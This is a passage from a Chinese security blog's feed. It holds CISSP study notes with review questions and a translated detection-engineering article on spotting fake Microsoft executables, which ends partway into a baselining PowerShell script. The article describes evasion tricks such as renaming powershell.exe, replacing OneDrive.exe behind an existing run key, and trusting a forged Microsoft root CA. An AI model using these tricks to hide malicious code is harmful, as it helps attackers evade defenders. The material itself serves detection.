威胁建模是潜在威胁被识别、分类和分析的安全流程。威胁建模的主动式方法发生于系统开发的早期阶段，特别是在初始设计和规范建立阶段。这种类型的威胁建模也被称为防御方式。这种方式基于编码和制作流程中对威胁的预测和特定防御中的设计，而不是依靠部署后的更新和补丁。威胁建模的被动式方法发生在产品被创建和部署之后。此部署可以在测试或实验室环境中，或是指被部署到一般市场上。这种类型的威胁建模也被称为对抗方式。这种威胁建模的技术是道德黑客攻击、渗透测试、代码审查和模糊测试背后的核心概念。</p><h4 id="1-4-1-识别威胁"><a href="#1-4-1-识别威胁" class="headerlink" title="1.4.1 识别威胁"></a>1.4.1 识别威胁</h4><ul><li><strong>关注资产</strong> 这种方法使用资产的估值结果，并试图识别对于宝贵资产的威胁。例如，可以评估一个特定的资产，以确定其是否容易受到攻击。如果资产寄存着数据，则可以评估访问控制来识别能够绕过身份认证或授权机制的威胁。</li><li><strong>关注攻击</strong> 一些组织能够识别潜在的攻击者，并能够基于攻击者的目标识别他们所代表的威胁。例如，政府往往能够识别潜在的攻击者，井识别攻击者想要达到的目标。然后他们可以使用这种知识来识别并保护他们的相关资产。这种方法面临的一个挑战是，可能会出现以往未被视为一种威胁的新攻击者。</li><li><strong>关注软件</strong> 如果一个组织开发了一个软件，则可能会考虑针对软件的潜在威胁。尽管几年前组织一般不自己开发软件，但如今这己非常常见。具体地说，大多数组织都有网络存在，许多都创建了自己的网页。精美的网页带来更多的流量，但他们也需要更复杂的编程，并会受到更多的威胁。</li></ul><p>STRIDE威胁分类方案经常用于对应用程序或操作系统威胁的评估。它包含：</p><ul><li>电子欺骗(Spoofing)</li><li>篡改(Tampering)</li><li>否认(Repudiation)</li><li>信息披露(Information disclosure)</li><li>拒绝服务(DoS)</li><li>权限提升(Elevation of privilege)</li></ul><h4 id="1-4-2-确定和用图表示潜在攻击"><a href="#1-4-2-确定和用图表示潜在攻击" class="headerlink" title="1.4.2 确定和用图表示潜在攻击"></a>1.4.2 确定和用图表示潜在攻击</h4><img src="/notes/cissp学习笔记（1）——通过原则和策略的安全治理/揭示威胁问题的图表实例.png"><h4 id="1-4-3-执行降低分析"><a href="#1-4-3-执行降低分析" class="headerlink" title="1.4.3 执行降低分析"></a>1.4.3 执行降低分析</h4><p>　　执行降低分析是为了分解应用程序、系统或环境。这个任务的目的是更好地理解产品逻辑及其与外部的交互元素。<br>在这个分解流程中，必须了解5个关键概念：</p><ul><li>信任边界信任或安全等级发生改变的位置。</li><li>数据流路径数据在两个位置之间的流动。</li><li>输入点接收外部输入的位置。</li><li>特权操作需要比标准用户账户或流程有更大特权的任何活动，通常需要进行系统修改或改变安全性。</li><li>安全立场和方法细节安全策略、安全基础和安全假设的声明。</li></ul><h4 id="1-4-4-优先级和响应"><a href="#1-4-4-优先级和响应" class="headerlink" title="1.4.4 优先级和响应"></a>1.4.4 优先级和响应</h4><p>　　编制文档后，要对威胁进行排序或定级。可以利用各种技术完成这个过程，如使用概率×潜在<br>损失的排名、高/中/低评级或DREAD系统。<br>设计DREAD 评级系统是为了提供灵活的评级解决方案，其基于对每种威胁的5个主要问题的回答：</p><ul><li>潜在破坏一一如果威胁成真，可能造成的损失有多严重?</li><li>再现性一一攻击者重现这一漏洞有多复杂?</li><li>可利用性一一实施攻击有多难?</li><li>受影响用户一一有多少用户可能受到攻击的影响(按百分比)7</li><li>可发现性攻击者发现弱点会有多难?</li></ul><p>　　通过询问这些以及潜在的额外自定义问题，并对这些回答标注目M几或3/2/1 值，就可以建立一张详细的威胁优先级表。</p><h3 id="1-5-考试要点"><a href="#1-5-考试要点" class="headerlink" title="1.5 考试要点"></a>1.5 考试要点</h3><ul><li><strong>理解CIA三元组的元素：机密性、完整性和可用性</strong> 机密性是客体不能暴露给未授权主体的原则。了解这条原则为什么重要、支持该原则的机制、针对该原则的攻击以及有效的对策。完整性是客体保持自身的正确性以及只能由己授权主体进行有意识修改的原则。了解这条原则为什么重要、支持该原则的机制、针对该原则的攻击以及有效的对策。可用性是经过授权的主体被及时准许和不被打断地访问客体的原则。了解这条原则为什么重要、支持该原则的机制、针对该原则的攻击以及有效的对策。</li><li><strong>能够解释身份标识是如何工作的</strong> 身份标识是一个过程，在这个过程中，主体会表明身份，并且开始提供可问责性。主体必须向系统提供身份，从而启动身份认证、授权和可问责的过程。</li><li>**理解身份认证的过程。认证或测试所声明身份合法性的过程就是身份认证。身份认证要求来自主体的附加信息必须完全对应于被表明的身份。</li><li><strong>了解如何在安全计划中实现授权</strong> 一旦主体通过了身份认证，其访问还必须经过授权。授权的过程确保请求的活动或客体访问，可能获得了为通过身份认证的身份而指派的权利和特权。</li><li><strong>理解安全治理</strong> 安全治理是关于组织支持、定义和指导安全工作的实践集合。</li><li><strong>能够解释审计过程</strong> 审计或监控是程序化方式，通过这种方式，主体在系统中经过身份认证的行为是可问责的。审计也是对系统中未经授权的或异常的活动进行检测的过程。我们需要通过审计来检测主体的恶意行为、入侵企图和系统故障以及重构事件，为起诉提供证据、生成问题报告和分析结果。</li><li><strong>理解可问责性的重要性</strong> 只有在支持可问责性时，组织的安全策略才能够被正确实施。换句话说，只有在主体的活动可问责时，才能够保持安全性。有效的可问责’性依赖于检验主体身份以及跟踪其活动的能力。</li><li><strong>能够解释不可否认性</strong> 不可否认性确保活动或事件的主体无法否认所发生的事件。不可否认性能够防止主体宣称自己没有发送消息、没有执行过某项活动或者不是某个事件的起因。</li><li><strong>理解安全管理计划编制</strong> 安全管理基于三种类型的计划： 战略计划、战术计划和操作计划。战略计划是长期计划，并且是相当稳定的，用于定义组织机构的目的、任务和目标。战术计划是中期计划，用来提供更加详细的实现战略计划所提出目标的计划。操作计划是短期计划，是基于战略和战术计划的非常周详的计划。</li><li><strong>了解规范化安全策略结构的元素</strong> 为了生成全面的安全计划，需要适当地遵守下列要求： 安全策略、标准、基准、指导方针和程序。这些文档清楚地描述了安全需求并反映了责任方的适度关注。</li><li><strong>理解重要的安全角色</strong> 主要的安全角色有高层管理者、组织机构所有者、上层管理者、安全专家、用户、数据所有者、数据管理员以及审计人员。通过构建安全角色的层次，就可以全面限制风险。</li><li><strong>了解如何实现安全意识培训</strong> 在真正的培训开始之前，必须为用户建立树立为公认实体的安全意识。一旦树立了安全意识，培训或教育员工执行工作任务和遵守安全策略就可以开始了。所有的新员工都需要进行培训，这样他们才能够遵守安全策略中规定的所有标准、指导方针和程序。教育是一项更细致的工作，学当三/用户需要学习比他们完成工作任务实际所需知识多得多的知识。教育往往与用户参加认证考试或寻求职务晋升相关联。</li><li><strong>了解分层如何简化安全</strong> 分层是串联使用多个控制层次。使用多层次解决方案，使用许多控制去防范威胁。</li><li><strong>能够解释抽象的概念</strong> 抽象用于将相似的元素放入组、类别或角色(被整体性授予安全控制、限制或权限) 中，抽象提高了实施安全计划的效率。</li><li><strong>理解数据隐藏</strong> 顾名思义，数据隐藏防止主体发现或访问数据。在安全控制和程序设计中，数据隐藏通常是一个关键要素。</li><li><strong>理解对加密的需求</strong> 加密是对计划外的接收者隐藏通信数据的含义或意图的一种艺术和学科。加密可以具有很多形式，并且能够用于所有的电子通信类型，包括文本、音频和视频文件以及应用程序本身。加密技术是安全控制中一个非常重要的元素，尤其系统之间的数据传输更是如此。</li><li><strong>能够解释更改控制和更改管理的概念</strong> 安全环境的改变很可能引入会导致新脆弱性出现的漏洞、重叠、客体丢失和疏漏。面对更改，维持安全性的唯一方法是系统地管理更改。</li><li><strong>了解为什么和如何进行数据分类</strong> 数据分类旨在简化给客体组(而不是单独客体)分配安全控制的过程。两种通用的分类方案是政府/军方分类和商业/私营部门分类。了解政府/军方分类中的5个级别和商业/私营部门分类中的4个级别。</li><li><strong>理解解除分类的重要性</strong> 一旦某个资产不再需要当前分配的分类或敏感性级别保护，就需要解除分类。</li><li><strong>了解COBIT的基础知识</strong> 信息及相关技术控制目标(COBIT)是一种安全概念基础架构，用于组织公司的复杂安全解决方案。</li><li><strong>了解威胁建模的基础知识</strong> 威胁建模是一种安全流程，能识别、分类和分析潜在威胁。威胁建模在设计开发阶段可作为一种提前措施来执行，或在产品被部署后作为一种被动性措施来执行。关键概念包括资产/攻击者/软件、STRIDE、图形表示、约简/分解和DREAD。</li><li><strong>了解安全并购的必要性</strong> 将网络安全风险管理与收购策略和实践进行综合是确保组织的安全策略成功强健的一种手段，而不管组织的规模是什么样的。如果在没有考虑安全性的情况下贸然购买，所购买的这些产品的固有风险将在其整个部署过程中一直存在。</li></ul><h3 id="1-6-复习题"><a href="#1-6-复习题" class="headerlink" title="1.6 复习题"></a>1.6 复习题</h3><ol><li><p>下列哪一项包含安全性的主要目标和目的?<br>A. 网络的外围边界<br>B. CIA 三元组<br>C. 一个独立的系统<br>D. 互联网</p></li><li><p>脆弱性和风险是基于它们对下列哪一项的威胁评估?<br>A 一条或多条CIA 三元组原则<br>B. 数据有效性<br>C. 应尽关注<br>D. 责任范围</p></li><li><p>下列哪一项在CIA 三元组原则中用于说明授权主体被及时授予和不间断地访问对象?<br>A. 识别<br>B. 可用性<br>C. 加密<br>D. 分层</p></li><li><p>下列哪一项不被视为违反保密性?<br>A. 窃取密码<br>B. 窃听<br>C. 硬件破坏<br>D. 杜会工程学</p></li><li><p>下列哪一项是不正确的?<br>A. 保密性的违反包括人为错误。<br>B. 保密性的违反包括管理监督。<br>C. 保密性的违反仅限于直接故意攻击。<br>D. 当传输未正确加密时保密性违反可能发生。</p></li><li><p>STRIDE 通常与用于评估针对应用程序或操作系统的威胁有关。以下哪一项不是STRIDE的元素?<br>A. 欺骗<br>B. 权限提升<br>C. 否认<br>D. 披露</p></li><li><p>如果一个安全机制提供可用性，也就提供了高级别保证，该授权对象可以___数据、对象和资源。<br>A. 控制<br>B. 审计<br>C. 访问<br>D. 否认</p></li><li><p>___指的是保持信息的机密性，防止一旦泄露，个人身份可能造成伤害、尴尬或丢人。<br>A. 隐居<br>B. 隐敲<br>C. 隐私<br>D. 临界</p></li><li><p>对于所有个人的影响，除了下面哪一项以外都需要注意?<br>A. 制约个人电子邮件<br>B. 记录电话交谈<br>C. 收集关于上网习惯的信息<br>D. 用于保留电子邮件的备份机制</p></li><li><p>数据分类管理的什么元素可以覆盖所有其他访问控制的形式?<br>A. 分类<br>B. 物理访问<br>C. 监管者职责<br>D. 取得所有权</p></li><li><p>什么确保了活动或事件的主体不能否认发生过的事件?<br>A. CIA 三元组<br>B. 抽象<br>C. 不可否认性<br>D. 哈希总数</p></li><li><p>以下哪一项相对于分层安全是最重要和独特的概念?<br>A. 多层<br>B. 系列<br>C. 并行<br>D. 过滤</p></li><li><p>下列哪一项不被认为是数据隐藏的例子?<br>A. 防止对象的授权阅读者删除该对象<br>B. 阻止未经授权的访问者访问数据库<br>C. 限制较低级别的主体访问较高级别的数据<br>D. 阻止应用程序直接访问硬件</p></li><li><p>变更管理的主要目标是什么?<br>A. 维护文档<br>B. 保持用户得到变更通知<br>C. 允许失败变更的回滚<br>D. 防止安全危害</p></li><li><p>数据分类方案的主要目标是什么?<br>A. 控制授权主体访问对象<br>B. 为了形式化和根据重要性和敏感性分配标签以分层保护数据的过程<br>C. 为审计可问责性建立交易跟踪<br>D. 为操作访问控制以提供最有效的手段来授予或限制功能</p></li><li><p>在分类数据时，下列哪一项通常是不考虑的特征?<br>A. 价值<br>B. 物体的大小<br>C. 使用寿命<br>D. 国家安全的影响</p></li><li><p>两种常见的数据分类方案是哪些?<br>A. 军事和私营部门<br>B. 个人和政府<br>C. 私营部门和非限制性行业<br>D. 分类和未分类</p></li><li><p>下列哪一项是机密数据的最低军事数据分类?<br>A. 敏感<br>B. 机密<br>C. 专有<br>D. 隐私</p></li><li><p>下列商业/私营部门的哪一个数据分类用来控制组织内的个人信息?<br>A. 机密<br>B. 隐私<br>C. 敏感<br>D. 专有</p></li><li><p>数据分类都用于关注安全控制，除了以下哪一个?<br>A. 存储<br>B. 处理<br>C. 分层<br>D. 转移</p></li></ol>]]></content>
    
    <summary type="html">
    
      本文为cissp中通过原则和策略的安全治理的学习笔记
    
    </summary>
    
      <category term="notes" scheme="https://www.diyz.bid/categories/notes/"/>
    
    
      <category term="cissp" scheme="https://www.diyz.bid/tags/cissp/"/>
    
      <category term="学习笔记" scheme="https://www.diyz.bid/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Microsoft可执行文件是怎么成为Microsoft可执行文件的</title>
    <link href="https://www.diyz.bid/Security/Microsoft%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E6%98%AF%E6%80%8E%E4%B9%88%E6%88%90%E4%B8%BAMicrosoft%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84/"/>
    <id>https://www.diyz.bid/Security/Microsoft可执行文件是怎么成为Microsoft可执行文件的/</id>
    <published>2018-09-06T01:53:48.000Z</published>
    <updated>2018-10-11T10:12:52.868Z</updated>
    
    <content type="html"><![CDATA[<p>　　究竟如何能够区分任意代码与源自Microsoft的代码？我敢打赌，大多数人的反应是：“如果它是由微软签署的，那么它来自微软。“<br>　　我提出这个问题的原因是它的事件量非常大并且无数次被列为威胁评估对象，以至于防御者的优先处理方式是过滤掉已知良好二进制和行为。理论上来说这样做唯一需要考虑的是分类可疑事件（即任何未明确归类为良性的事件）。然而，这个过程必须非常谨慎地制定规则，因为攻击者总是会试用各种方法将恶意行为与良性的二进制和行为融合在一起。<br>　　如何将Microsoft可执行文件归类为良性？为了定义这样一个过程，它有助于理解攻击者如何尝试伪装成Microsoft可执行文件。让我们考虑以下绕过检测的情况：</p><h3 id="1-一个已签名的可被滥用的EXE文件被复制到另一个目录并且重命名为检测良好的文件名后执行以绕过命令行检测"><a href="#1-一个已签名的可被滥用的EXE文件被复制到另一个目录并且重命名为检测良好的文件名后执行以绕过命令行检测" class="headerlink" title="1.一个已签名的可被滥用的EXE文件被复制到另一个目录并且重命名为检测良好的文件名后执行以绕过命令行检测"></a>1.一个已签名的可被滥用的EXE文件被复制到另一个目录并且重命名为检测良好的文件名后执行以绕过命令行检测</h3><p>　　请考虑以下情形：攻击者希望执行恶意PowerShell代码并避免命令行日志记录。他们知道防御者在命令行上可以轻松地检测到“powershell”的“-Command”和“-EncodedCommand”的各种变体。因此，攻击者会将powershell.exe复制到他们能够控制的目录并将其重命名为notepad.exe。熟练的防御者们为了解决这个问题，他们只检测命令行上“-Command”和“-EncodedCommand”的各种变体。对此，经验丰富的攻击者会删除恶意PowerShell的配置文件，目的是从良性的.DAT文件中读取PowerShell代码。这样做可以实现两件事：</p><ol><li>攻击者将其恶意的PowerShell有效负载作为notepad.exe执行，其中没有防御者能够发现的命令行参数。</li><li>与.DAT文件（或任何其他任意文件扩展名）相比，传统的反病毒系统更可能对.PS1文件进行更严格的审查。</li></ol><p>在这种情况下，检测的高级目标如下：</p><blockquote><p>检测已知的，可滥用的，已签名的应用程序的使用，这些应用程序不在其默认的路径和文件名。</p></blockquote><h3 id="2-攻击者试图通过替换良性可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件"><a href="#2-攻击者试图通过替换良性可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件" class="headerlink" title="2.攻击者试图通过替换良性可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件"></a>2.攻击者试图通过替换良性可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件</h3><p>　　请考虑以下情形：您以标准用户身份访问计算机，并希望保留恶意可执行文件。这可能是攻击者可能已完成其作业并将Autoruns用于恶意目的的情况。他们用它来识别隐藏的地方，而不是用它来寻找潜在的威胁。因此，它们会查找所有内置的持久性条目，这些条目指向位于可以控制的目录中的二进制文件。OneDrive是一个很好的候选者，因为它默认保存运行密钥，它位于用户的％APPDATA％目录中。因此，攻击者只需将OneDrive.exe替换为其恶意可执行文件，就可以保持现有的运行密钥不变。</p><img src="/Security/Microsoft可执行文件是怎么成为Microsoft可执行文件的/HKCU为OneDrive运行密钥条目.png" title="[HKCU为OneDrive运行密钥条目，OneDrive位于用户的AppData目录中]"><p>在这种情况下，检测的高级目标如下：</p><blockquote><p>对于公共持久性条目，可执行文件的哪些属性使其正常？如果可以建立“正常”，那么偏离正常应该被认为是可疑的。</p></blockquote><p>让我们提炼出这种场景中攻击者使用的技术：</p><ol><li>预期存在于该目录中的OneDrive可执行文件源自Microsoft。攻击者提供的二进制文件不是来自Microsoft。</li><li>攻击者不是创建新的运行密钥，而是替换现有合法运行密钥指向的二进制文件。</li></ol><h3 id="3-攻击者后门系统可执行文件"><a href="#3-攻击者后门系统可执行文件" class="headerlink" title="3.攻击者后门系统可执行文件"></a>3.攻击者后门系统可执行文件</h3><p>　　在这种情况下，攻击者使用像Backdoor Factory这样的工具来回溯系统可执行文件。<br>从检测角度考虑以下目标：</p><blockquote><p>系统可执行文件应驻留在特定目录中，并且应具有有效的Microsoft签名。任何改变都应被视为可疑。</p></blockquote><h3 id="4-攻击者伪装Microsoft数字签名并使用“Microsoft”证书签署其恶意代码"><a href="#4-攻击者伪装Microsoft数字签名并使用“Microsoft”证书签署其恶意代码" class="headerlink" title="4.攻击者伪装Microsoft数字签名并使用“Microsoft”证书签署其恶意代码"></a>4.攻击者伪装Microsoft数字签名并使用“Microsoft”证书签署其恶意代码</h3><p>　　攻击者可以将合法的Microsoft数字签名应用于其恶意代码，并通过执行SIP/信任提供程序劫持攻击（需要提升权限）强制其生效。他们还可以制作一个具有Microsoft证书链外观的证书链，并在受害者系统上明确信任他们虚假的“Microsoft”根CA.</p><p>在这种情况下，检测的高级目标如下：</p><blockquote><p>检测对负责代码签名验证的注册表值的更改，确定值得信任的根CA，并针对给定二进制文件与预期根CA的改变发出警报。</p></blockquote><h2 id="共同防护假设"><a href="#共同防护假设" class="headerlink" title="共同防护假设"></a>共同防护假设</h2><p>　　鉴于这些特别绕过的攻击情景，重要的是对自己诚实并承认一些共同的维护者假设，否则，在成熟的攻击者面前不会有持续改进的希望。此外，正如Dane Stuckey雄辩地说的那样：“检测工程是一个永无止境的旅程。如果你认为自己到达目的地，那你就已经失败了。“</p><ul><li>防御者可能不会认为攻击者可能会重命名可执行文件或考虑这样做的理由。</li><li>防御者可能不会考虑攻击者将可执行文件复制到另一个目录的理由。</li><li>一种假设可能是攻击者更有可能建立一种新的持久性技术而不是劫持现有的合法技术。</li><li>防御者可能不会考虑或使用光学器件来检测未签名的系统可执行文件（或具有无效签名的可执行文件）的加载，否则该文件应具有经过验证的签名。</li><li>防御者可能隐含地信任签名验证实用程序的输出，而不考虑根CA信任的含义/含义。<br>　　现在，如果没有提出的解决方案，确定问题并不是很有用。以下将讨论可执行文件的属性，在处理和克服这些突出显示的假设时应考虑这些属性。</li></ul><h3 id="定义良性Microsoft可执行文件的功能"><a href="#定义良性Microsoft可执行文件的功能" class="headerlink" title="定义良性Microsoft可执行文件的功能"></a>定义良性Microsoft可执行文件的功能</h3><p>　　因此，从防御者的角度来看，我们可以使用哪些可执行文件属性将给定的Microsoft可执行文件分类为正确的Microsoft可执行文件？我建议如下：</p><h4 id="1-可执行文件的原始路径。"><a href="#1-可执行文件的原始路径。" class="headerlink" title="1.可执行文件的原始路径。"></a>1.可执行文件的原始路径。</h4><p>　　例如，应该注意notepad.exe应该驻留在％windir％，％windir％\ System32和％windir％\ SysWOW64中。任何偏离这些路径的行为都应被视为可疑。另请注意，我通过其环境变量引用Windows目录。永远不要认为启动分区是“C”。</p><h4 id="2-可执行文件的预期文件名。"><a href="#2-可执行文件的预期文件名。" class="headerlink" title="2.可执行文件的预期文件名。"></a>2.可执行文件的预期文件名。</h4><p>　　任何与预期文件名的偏差都应被视为可疑。</p><h4 id="3-可执行文件的原始文件名。"><a href="#3-可执行文件的原始文件名。" class="headerlink" title="3.可执行文件的原始文件名。"></a>3.可执行文件的原始文件名。</h4><p>　　原始文件名出现在几乎所有已签名的PE文件的“版本信息”资源中。这是您在查看PE文件属性的“详细信息”选项卡时看到的内容。</p><img src="/Security/Microsoft可执行文件是怎么成为Microsoft可执行文件的/文件属性.png"><p>请注意，原始文件名并不总是与磁盘上的预期文件名相同。原始文件名的好处是，任何修改它的尝试都将使二进制文件的签名无效。这就是Windows Defender应用程序控制（WDAC）阻止单个文件的方式。</p><h4 id="4-可执行文件的文件描述。"><a href="#4-可执行文件的文件描述。" class="headerlink" title="4.可执行文件的文件描述。"></a>4.可执行文件的文件描述。</h4><p>　　这是“版本信息”资源中存在的另一个字段，可以考虑添加或替代原始文件名。在某些情况下，可能不存在原始文件名，因此应在其位置考虑文件描述。这就是fsi.exe的情况 - 由Matt Nelson发现的一个可滥用的二进制文件，在微软添加了阻止其他“版本信息”属性的能力之前，最初无法被WDAC有效阻止。</p><h4 id="5-可执行文件的签名状态。"><a href="#5-可执行文件的签名状态。" class="headerlink" title="5.可执行文件的签名状态。"></a>5.可执行文件的签名状态。</h4><p>　　对于预期要签名的二进制文件，除“有效”之外的任何签名验证状态都应被视为可疑。Get-AuthenticodeSignature cmdlet支持以下值以供参考：</p><ul><li>HashMismatch - 表示可执行文件的完整性受到损害</li><li>不相容</li><li>未签名</li><li>NotSupportedFileFormat</li><li>不可信 - 表示签名者的证书已被撤销或明确标记为不允许。</li><li>有效 - 表示已验证可执行文件的完整性，并且证书链正确链接到受信任的根CA.<br>　　应该注意的是，如果PE文件没有“数字签名”选项卡而没有签名，那么这是一种常见的误解。几乎所有内置于Windows的代码都已签名，其中大部分都是目录签名的。如果在目标系统之外的某处执行签名验证，这肯定会有问题，这是VirusTotal所阐述的挑战。</li></ul><h4 id="6-文件是否为内置Windows二进制文件？"><a href="#6-文件是否为内置Windows二进制文件？" class="headerlink" title="6.文件是否为内置Windows二进制文件？"></a>6.文件是否为内置Windows二进制文件？</h4><p>　　随操作系统提供的任何代码都将进行Windows签名，由包含“Windows系统组件验证”EKU属性（OID - 1.3.6.1.4.1.311.10.3.6）的Microsoft数字签名表示。如果签名有效，则Get-AuthenticodeSignature的“IsOSBinary”属性将返回true，是Windows签名的，并且根植于一小组受信任的Microsoft根CA.</p><h4 id="7-签名者主题和指纹"><a href="#7-签名者主题和指纹" class="headerlink" title="7.签名者主题和指纹"></a>7.签名者主题和指纹</h4><p>　　证书的主题字段用于标识颁发证书的组织。指纹（即证书的SHA1哈希）用于断言证书的完整性。有一大堆Microsoft签名证书。从检测角度来看，该字段仅用于提供信息。最准确地说，由Microsoft签名的代码由一小组根CA证书之一颁发的任何证书签名。</p><h4 id="8-根发行者主题和指纹"><a href="#8-根发行者主题和指纹" class="headerlink" title="8.根发行者主题和指纹"></a>8.根发行者主题和指纹</h4><p>　　签名仅与发布它的根CA一样可信。攻击者可以轻松地信任受害者系统上的恶意根CA证书，这就是为什么在执行签名验证时识别一小组Microsoft根CA很重要的原因。它们由以下指纹/主题值组成：</p><ul><li>CDD4EEAE6000AC7F40C3802C171E30148030C072 - CN = Microsoft根证书颁发机构，DC = microsoft，DC = com</li><li>A43489159A520F0D93D032CCAF37E7FE20A8B419 - CN = Microsoft Root Authority，OU = Microsoft Corporation，OU =版权所有©1997 Microsoft Corp.</li><li>3B1EFD3A66EA28B16697394703A72CA340A05BD5 - CN = Microsoft根证书颁发机构2010，O = Microsoft Corporation，L = Redmond，S = Washington，C = US</li><li>8F43288AD272F3103B6FB1428485EA3014C0BCFE - CN = Microsoft根证书颁发机构2011，O = Microsoft Corporation，L = Redmond，S = Washington，C = US</li><li>（可选，如果您想信任Windows Insider预览代码）F8DB7E1C16F1FFD4AAAD4AAD8DFF0F2445184AEB - CN = Microsoft Development Root Certificate Authority 2014，O = Microsoft Corporation，L = Redmond，S = Washington，C = US<br>　　不要相信我！通过与authroot.stl或使用sigcheck -tv和比较来验证自己sigcheck -tuv。<h3 id="建立基线程序"><a href="#建立基线程序" class="headerlink" title="建立基线程序"></a>建立基线程序</h3>上面强调的所有相关属性都需要首先在一组清洁系统上进行基线化 - 标准的企业黄金映像将是理想的。您如何决定捕获这些属性取决于您。我编写了这个PowerShell脚本来获取黄金映像中的所有相关信息：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GetPEFeature.ps1 - 一个PowerShell脚本，用于从PE文件中提取相关功能</span></span><br><span class="line"><span class="keyword">filter</span> Get-PEFeature &#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.SYNOPSIS</span></span></span><br><span class="line"><span class="comment">Retrieves key features from PE files that can be used to build detections.</span></span><br><span class="line"><span class="comment"><span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">Get-PEFeature extracts key features of PE files that are relevant to building detections.</span></span><br><span class="line"><span class="comment">Author: Matthew Graeber (@mattifestation)</span></span><br><span class="line"><span class="comment">License: BSD 3-Clause</span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">ls C:\Windows\System32\*.exe | Get-PEFeature</span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">ls C:\Windows\System32\*.exe | Get-PEFeature | ConvertTo-Json</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"></span><br><span class="line">    [CmdletBinding()]</span><br><span class="line">    <span class="keyword">param</span> (</span><br><span class="line">        [Parameter(Position = <span class="number">0</span>, Mandatory = <span class="literal">$True</span>, ValueFromPipelineByPropertyName = <span class="literal">$True</span>)]</span><br><span class="line">        [String]</span><br><span class="line">        [Alias(<span class="string">'FullName'</span>)]</span><br><span class="line">        <span class="variable">$Path</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="variable">$HeaderBytes</span> = <span class="built_in">Get-Content</span> -TotalCount <span class="number">2</span> -Encoding Byte -Path <span class="variable">$Path</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$HeaderBytes</span>.Count <span class="nomarkup">-ne</span> <span class="number">2</span>) -or ([Text.Encoding]::ASCII.GetString(<span class="variable">$HeaderBytes</span>) <span class="nomarkup">-ne</span> <span class="string">'MZ'</span>)) &#123;</span><br><span class="line">        <span class="built_in">Write-Verbose</span> <span class="string">"<span class="variable">$Path</span> is not a valid PE file."</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$FileInfo</span> = <span class="built_in">Get-Item</span> -Path <span class="variable">$Path</span></span><br><span class="line">        <span class="variable">$FileVersionInfo</span> = <span class="variable">$FileInfo</span>.VersionInfo</span><br><span class="line"></span><br><span class="line">        <span class="comment"># If a path starts with %windir%, %ProgramFiles%, %ProgramFiles(x86)%, or %APPDATA%,</span></span><br><span class="line">        <span class="comment"># replace it to account for alternate system drives</span></span><br><span class="line">        <span class="variable">$ExpectedPath</span> = <span class="variable">$FileInfo</span>.DirectoryName <span class="nomarkup">-replace</span> <span class="string">"^$([Regex]::Escape(<span class="variable">$Env:windir</span>))"</span>, <span class="string">'%windir%'</span></span><br><span class="line">        <span class="variable">$ExpectedPath</span> = <span class="variable">$ExpectedPath</span> <span class="nomarkup">-replace</span> <span class="string">"^$([Regex]::Escape(<span class="variable">$Env:ProgramFiles</span>))"</span>, <span class="string">'%ProgramFiles%'</span></span><br><span class="line">        <span class="variable">$ExpectedPath</span> = <span class="variable">$ExpectedPath</span> <span class="nomarkup">-replace</span> <span class="string">"^$([Regex]::Escape($&#123;Env:ProgramFiles(x86)&#125;))"</span>, <span class="string">'%ProgramFiles(x86)%'</span></span><br><span class="line">        <span class="variable">$ExpectedPath</span> = <span class="variable">$ExpectedPath</span> <span class="nomarkup">-replace</span> <span class="string">"^$([Regex]::Escape(<span class="variable">$Env:APPDATA</span>))"</span>, <span class="string">'%APPDATA%'</span></span><br><span class="line">        <span class="variable">$ExpectedPath</span> = <span class="variable">$ExpectedPath</span> <span class="nomarkup">-replace</span> <span 